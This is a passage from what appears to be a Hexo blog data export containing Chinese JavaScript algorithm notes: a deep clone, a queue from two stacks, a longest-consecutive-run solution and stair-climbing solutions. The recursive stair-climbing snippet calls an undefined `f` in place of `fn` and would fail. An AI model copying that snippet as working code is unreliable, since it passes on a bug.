class=\"built_in\">Object</span>.keys(target);</span><br><span class=\"line\">    forEach(keys || target, <span class=\"function\">(<span class=\"params\">value, key</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (keys) &#123;</span><br><span class=\"line\">            key = value;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        cloneTarget[key] = clone(target[key], map);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> cloneTarget;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">    clone</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>"},{"title":"两个栈实现队列","date":"2021-05-24T08:32:28.000Z","_content":"\n# 两个栈实现队列\n\n```js\nvar CQueue = function () {\n  this.stackA = [];\n  this.stackB = [];\n};\n\nCQueue.prototype.appendTail = function (value) {\n  this.stackA.push(value);\n};\n\nCQueue.prototype.deleteHead = function () {\n  if (this.stackB.length) {\n    return this.stackB.pop();\n  } else {\n    while (this.stackA.length) {\n      this.stackB.push(this.stackA.pop());\n    }\n    if (!this.stackB.length) {\n      return -1;\n    } else {\n      return this.stackB.pop();\n    }\n  }\n};\n\n```","source":"_posts/算法题/两个栈实现队列.md","raw":"---\ntitle: 两个栈实现队列\ncategories: 算法题\ntags: [算法题]\ndate: 2021-05-24 16:32:28\n---\n\n# 两个栈实现队列\n\n```js\nvar CQueue = function () {\n  this.stackA = [];\n  this.stackB = [];\n};\n\nCQueue.prototype.appendTail = function (value) {\n  this.stackA.push(value);\n};\n\nCQueue.prototype.deleteHead = function () {\n  if (this.stackB.length) {\n    return this.stackB.pop();\n  } else {\n    while (this.stackA.length) {\n      this.stackB.push(this.stackA.pop());\n    }\n    if (!this.stackB.length) {\n      return -1;\n    } else {\n      return this.stackB.pop();\n    }\n  }\n};\n\n```","slug":"算法题/两个栈实现队列","published":1,"updated":"2021-05-31T08:20:55.256Z","_id":"ckpccb4ep0002hq6relq4gwt1","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"两个栈实现队列\"><a href=\"#两个栈实现队列\" class=\"headerlink\" title=\"两个栈实现队列\"></a>两个栈实现队列</h1><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> CQueue = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">this</span>.stackA = [];</span><br><span class=\"line\">  <span class=\"built_in\">this</span>.stackB = [];</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">CQueue.prototype.appendTail = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">value</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">this</span>.stackA.push(value);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">CQueue.prototype.deleteHead = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"built_in\">this</span>.stackB.length) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.stackB.pop();</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (<span class=\"built_in\">this</span>.stackA.length) &#123;</span><br><span class=\"line\">      <span class=\"built_in\">this</span>.stackB.push(<span class=\"built_in\">this</span>.stackA.pop());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"built_in\">this</span>.stackB.length) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> -<span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.stackB.pop();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"两个栈实现队列\"><a href=\"#两个栈实现队列\" class=\"headerlink\" title=\"两个栈实现队列\"></a>两个栈实现队列</h1><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> CQueue = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">this</span>.stackA = [];</span><br><span class=\"line\">  <span class=\"built_in\">this</span>.stackB = [];</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">CQueue.prototype.appendTail = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">value</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">this</span>.stackA.push(value);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">CQueue.prototype.deleteHead = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"built_in\">this</span>.stackB.length) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.stackB.pop();</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (<span class=\"built_in\">this</span>.stackA.length) &#123;</span><br><span class=\"line\">      <span class=\"built_in\">this</span>.stackB.push(<span class=\"built_in\">this</span>.stackA.pop());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"built_in\">this</span>.stackB.length) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> -<span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.stackB.pop();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>"},{"title":"环","date":"2021-05-24T08:32:28.000Z","_content":"\n# 环\n\n## 判断链表是否有环\n\n## 如果链表有环，求环的长度\n\n## 如果链表有环，求环的入环点\n\n\n#### 最小栈\n\n#### 最大公约数\n\n#### 二进制操作\n","source":"_posts/算法题/环.md","raw":"---\ntitle: 环\ncategories: 算法题\ntags: [算法题]\ndate: 2021-05-24 16:32:28\n---\n\n# 环\n\n## 判断链表是否有环\n\n## 如果链表有环，求环的长度\n\n## 如果链表有环，求环的入环点\n\n\n#### 最小栈\n\n#### 最大公约数\n\n#### 二进制操作\n","slug":"算法题/环","published":1,"updated":"2021-05-31T08:20:44.373Z","_id":"ckpccb4eq0003hq6rc8pt65f5","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"环\"><a href=\"#环\" class=\"headerlink\" title=\"环\"></a>环</h1><h2 id=\"判断链表是否有环\"><a href=\"#判断链表是否有环\" class=\"headerlink\" title=\"判断链表是否有环\"></a>判断链表是否有环</h2><h2 id=\"如果链表有环，求环的长度\"><a href=\"#如果链表有环，求环的长度\" class=\"headerlink\" title=\"如果链表有环，求环的长度\"></a>如果链表有环，求环的长度</h2><h2 id=\"如果链表有环，求环的入环点\"><a href=\"#如果链表有环，求环的入环点\" class=\"headerlink\" title=\"如果链表有环，求环的入环点\"></a>如果链表有环，求环的入环点</h2><h4 id=\"最小栈\"><a href=\"#最小栈\" class=\"headerlink\" title=\"最小栈\"></a>最小栈</h4><h4 id=\"最大公约数\"><a href=\"#最大公约数\" class=\"headerlink\" title=\"最大公约数\"></a>最大公约数</h4><h4 id=\"二进制操作\"><a href=\"#二进制操作\" class=\"headerlink\" title=\"二进制操作\"></a>二进制操作</h4>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"环\"><a href=\"#环\" class=\"headerlink\" title=\"环\"></a>环</h1><h2 id=\"判断链表是否有环\"><a href=\"#判断链表是否有环\" class=\"headerlink\" title=\"判断链表是否有环\"></a>判断链表是否有环</h2><h2 id=\"如果链表有环，求环的长度\"><a href=\"#如果链表有环，求环的长度\" class=\"headerlink\" title=\"如果链表有环，求环的长度\"></a>如果链表有环，求环的长度</h2><h2 id=\"如果链表有环，求环的入环点\"><a href=\"#如果链表有环，求环的入环点\" class=\"headerlink\" title=\"如果链表有环，求环的入环点\"></a>如果链表有环，求环的入环点</h2><h4 id=\"最小栈\"><a href=\"#最小栈\" class=\"headerlink\" title=\"最小栈\"></a>最小栈</h4><h4 id=\"最大公约数\"><a href=\"#最大公约数\" class=\"headerlink\" title=\"最大公约数\"></a>最大公约数</h4><h4 id=\"二进制操作\"><a href=\"#二进制操作\" class=\"headerlink\" title=\"二进制操作\"></a>二进制操作</h4>"},{"title":"最长递增序列","date":"2021-05-24T08:32:28.000Z","_content":"\n# 最长递增序列\n\nQ: 无序数组 & 不用连续 & 递增为 1 的数字长度\n\n如 `[1,3,5,4]`，则 `3,4,5` 满足要求，返回 3\n\n```js\nvar findLengthOfLCIS = function(nums) {\n  if (!nums.length) return 0;\n\n  let res = 1;\n  let max = 1;\n\n  nums.sort((a, b) => a - b);\n\n  for (let i = 0; i < nums.length; i++) {\n    if (i === 0) continue;\n\n    if (nums[i] === nums[i - 1] + 1) {\n      max++;\n      res = Math.max(res, max);\n    } else {\n      max = 1;\n    }\n\n    console.log(res);\n  }\n\n  return res;\n};\n\nconsole.log(findLengthOfLCIS([1,3,5,4,7])); // 3\nconsole.log(findLengthOfLCIS([1,3,15,4,7,2])); // 4\nconsole.log(findLengthOfLCIS([2, 2,2 ,2])); // 1\n```","source":"_posts/算法题/最长递增序列.md","raw":"---\ntitle: 最长递增序列\ncategories: 算法题\ntags: [算法题]\ndate: 2021-05-24 16:32:28\n---\n\n# 最长递增序列\n\nQ: 无序数组 & 不用连续 & 递增为 1 的数字长度\n\n如 `[1,3,5,4]`，则 `3,4,5` 满足要求，返回 3\n\n```js\nvar findLengthOfLCIS = function(nums) {\n  if (!nums.length) return 0;\n\n  let res = 1;\n  let max = 1;\n\n  nums.sort((a, b) => a - b);\n\n  for (let i = 0; i < nums.length; i++) {\n    if (i === 0) continue;\n\n    if (nums[i] === nums[i - 1] + 1) {\n      max++;\n      res = Math.max(res, max);\n    } else {\n      max = 1;\n    }\n\n    console.log(res);\n  }\n\n  return res;\n};\n\nconsole.log(findLengthOfLCIS([1,3,5,4,7])); // 3\nconsole.log(findLengthOfLCIS([1,3,15,4,7,2])); // 4\nconsole.log(findLengthOfLCIS([2, 2,2 ,2])); // 1\n```","slug":"算法题/最长递增序列","published":1,"updated":"2021-05-31T08:21:25.275Z","_id":"ckpccb4er0004hq6r8aab6mb7","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"最长递增序列\"><a href=\"#最长递增序列\" class=\"headerlink\" title=\"最长递增序列\"></a>最长递增序列</h1><p>Q: 无序数组 &amp; 不用连续 &amp; 递增为 1 的数字长度</p>\n<p>如 <code>[1,3,5,4]</code>，则 <code>3,4,5</code> 满足要求，返回 3</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> findLengthOfLCIS = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">nums</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!nums.length) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> res = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> max = <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  nums.sort(<span class=\"function\">(<span class=\"params\">a, b</span>) =&gt;</span> a - b);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (i === <span class=\"number\">0</span>) <span class=\"keyword\">continue</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (nums[i] === nums[i - <span class=\"number\">1</span>] + <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">      max++;</span><br><span class=\"line\">      res = <span class=\"built_in\">Math</span>.max(res, max);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      max = <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(res);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(findLengthOfLCIS([<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">4</span>,<span class=\"number\">7</span>])); <span class=\"comment\">// 3</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(findLengthOfLCIS([<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">15</span>,<span class=\"number\">4</span>,<span class=\"number\">7</span>,<span class=\"number\">2</span>])); <span class=\"comment\">// 4</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(findLengthOfLCIS([<span class=\"number\">2</span>, <span class=\"number\">2</span>,<span class=\"number\">2</span> ,<span class=\"number\">2</span>])); <span class=\"comment\">// 1</span></span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"最长递增序列\"><a href=\"#最长递增序列\" class=\"headerlink\" title=\"最长递增序列\"></a>最长递增序列</h1><p>Q: 无序数组 &amp; 不用连续 &amp; 递增为 1 的数字长度</p>\n<p>如 <code>[1,3,5,4]</code>，则 <code>3,4,5</code> 满足要求，返回 3</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> findLengthOfLCIS = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">nums</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!nums.length) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> res = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> max = <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  nums.sort(<span class=\"function\">(<span class=\"params\">a, b</span>) =&gt;</span> a - b);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (i === <span class=\"number\">0</span>) <span class=\"keyword\">continue</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (nums[i] === nums[i - <span class=\"number\">1</span>] + <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">      max++;</span><br><span class=\"line\">      res = <span class=\"built_in\">Math</span>.max(res, max);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      max = <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(res);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(findLengthOfLCIS([<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">4</span>,<span class=\"number\">7</span>])); <span class=\"comment\">// 3</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(findLengthOfLCIS([<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">15</span>,<span class=\"number\">4</span>,<span class=\"number\">7</span>,<span class=\"number\">2</span>])); <span class=\"comment\">// 4</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(findLengthOfLCIS([<span class=\"number\">2</span>, <span class=\"number\">2</span>,<span class=\"number\">2</span> ,<span class=\"number\">2</span>])); <span class=\"comment\">// 1</span></span><br></pre></td></tr></table></figure>"},{"title":"上台阶问题","date":"2021-05-24T08:32:28.000Z","_content":"\n# 上台阶问题\n\n有一座高度是 n 级台阶的楼梯，从下往上走，每跨一步只能向上 1 级或者 2 级台阶。要求用程序来求出一共有多少种走法\n\n\n```js\n// 递归\nconst fn = (n) => {\n  if (n === 1) return 1;\n  if (n === 2) return 2;\n  \n  return fn(n - 1) + f(n -2)\n}\n```\n\n```js\n// 备忘录\nconst fn = (n) => {\n  const memo = {\n    1: 1,\n    2: 2,\n  };\n  \n  for (let i = 3; i <= n; i++) {\n    memo[i] = memo[i - 1] + memo[i - 2];\n  }\n\n  return memo[n];\n};\n```\n\n```js\n// 动态规划\nconst fn = (n) => {\n  if (n === 1) return 1;\n  if (n === 2) return 2;\n  \n  let a = 1; // 上上一步的结果\n  let b = 2; // 上一步的结果\n  let res = 0; // 当前步的结果\n\n  for (let i = 3; i <= n; i++) {\n    res = a + b;\n    a = b;\n    b = res;\n  }\n\n  return res;\n};\n```","source":"_posts/算法题/上台阶问题.md","raw":"---\ntitle: 上台阶问题\ncategories: 算法题\ntags: [算法题]\ndate: 2021-05-24 16:32:28\n---\n\n# 上台阶问题\n\n有一座高度是 n 级台阶的楼梯，从下往上走，每跨一步只能向上 1 级或者 2 级台阶。要求用程序来求出一共有多少种走法\n\n\n```js\n// 递归\nconst fn = (n) => {\n  if (n === 1) return 1;\n  if (n === 2) return 2;\n  \n  return fn(n - 1) + f(n -2)\n}\n```\n\n```js\n// 备忘录\nconst fn = (n) => {\n  const memo = {\n    1: 1,\n    2: 2,\n  };\n  \n  for (let i = 3; i <= n; i++) {\n    memo[i] = memo[i - 1] + memo[i - 2];\n  }\n\n  return memo[n];\n};\n```\n\n```js\n// 动态规划\nconst fn = (n) => {\n  if (n === 1) return 1;\n  if (n === 2) return 2;\n  \n  let a = 1; // 上上一步的结果\n  let b = 2; // 上一步的结果\n  let res = 0; // 当前步的结果\n\n  for (let i = 3; i <= n; i++) {\n    res = a + b;\n    a = b;\n    b = res;\n  }\n\n  return res;\n};\n```","slug":"算法题/上台阶问题","published":1,"updated":"2021-05-31T08:21:03.625Z","_id":"ckpccb4es0005hq6rf9dw37aa","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"上台阶问题\"><a href=\"#上台阶问题\" class=\"headerlink\" title=\"上台阶问题\"></a>上台阶问题</h1><p>有一座高度是 n 级台阶的楼梯，从下往上走，每跨一步只能向上 1 级或者 2 级台阶。要求用程序来求出一共有多少种走法</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 递归</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> fn = <span class=\"function\">(<span class=\"params\">n</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (n === <span class=\"number\">1</span>) <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (n === <span class=\"number\">2</span>) <span class=\"keyword\">return</span> <span class=\"number\">2</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">return</span> fn(n - <span class=\"number\">1</span>) + f(n -<span class=\"number\">2</span>)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 备忘录</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> fn = <span class=\"function\">(<span class=\"params\">n</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> memo = &#123;</span><br><span class=\"line\">    <span class=\"number\">1</span>: <span class=\"number\">1</span>,</span><br><span class=\"line\">    <span class=\"number\">2</span>: <span class=\"number\">2</span>,</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">3</span>; i &lt;= n; i++) &#123;</span><br><span class=\"line\">    memo[i] = memo[i - <span class=\"number\">1</span>] + memo[i - <span class=\"number\">2</span>];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> memo[n];</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 动态规划</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> fn = <span class=\"function\">(<span class=\"params\">n</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (n === <span class=\"number\">1</span>) <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (n === <span class=\"number\">2</span>) <span class=\"keyword\">return</span> <span class=\"number\">2</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">let</span> a = <span class=\"number\">1</span>; <span class=\"comment\">// 上上一步的结果</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> b = <span class=\"number\">2</span>; <span class=\"comment\">// 上一步的结果</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> res = <span class=\"number\">0</span>; <span class=\"comment\">// 当前步的结果</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">3</span>; i &lt;= n; i++) &#123;</span><br><span class=\"line\">    res = a + b;</span><br><span class=\"line\">    a = b;</span><br><span class=\"line\">    b = res;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"上台阶问题\"><a href=\"#上台阶问题\" class=\"headerlink\" title=\"上台阶问题\"></a>上台阶问题</h1><p>有一座高度是 n 级台阶的楼梯，从下往上走，每跨一步只能向上 1 级或者 2 级台阶。要求用程序来求出一共有多少种走法</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 递归</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> fn = <span class=\"function\">(<span class=\"params\">n</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (n === <span class=\"number\">1</span>) <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (n === <span class=\"number\">2</span>) <span class=\"keyword\">return</span> <span class=\"number\">2</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">return</span> fn(n - <span class=\"number\">1</span>) + f(n -<span class=\"number\">2</span>)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 备忘录</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> fn = <span class=\"function\">(<span class=\"params\">n</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> memo = &#123;</span><br><span class=\"line\">    <span class=\"number\">1</span>: <span class=\"number\">1</span>,</span><br><span class=\"line\">    <span class=\"number\">2</span>: <span class=\"number\">2</span>,</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">3</span>; i &lt;= n; i++) &#123;</span><br><span class=\"line\">    memo[i] = memo[i - <span class=\"number\">1</span>] + memo[i - <span class=\"number\">2</span>];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> memo[n];</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span 